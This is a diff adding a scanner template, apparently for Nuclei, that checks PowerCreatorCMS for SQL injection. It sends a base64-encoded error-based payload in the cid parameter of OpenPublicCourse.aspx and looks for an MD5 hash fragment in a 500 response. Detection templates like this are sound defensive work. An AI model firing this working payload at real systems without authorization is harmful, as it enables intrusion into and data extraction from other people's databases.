@@ -1,0 +1,26 @@
+id: PowerCreatorCMS-OpenPublicCourse-sqlInjection
+
+info:
+  name: PowerCreatorCMS OpenPublicCourse.aspx SQL Injection
+  author: iSee857
+  severity: high
+  description: SQL Injection vulnerability in PowerCreatorCMS via cid parameter
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /OpenPublicCourse.aspx?cid=NSBhbmQgMT1zeXMuZm5fc3FsdmFyYmFzZXRvc3RyKEhhc2hCeXRlcygnTUQ1JywnMTIzNDU2JykpLS0%3D HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "10adc3949ba59abbe56e057f20f883e"
+        condition: and
+      - type: status
+        status:
+          - 500
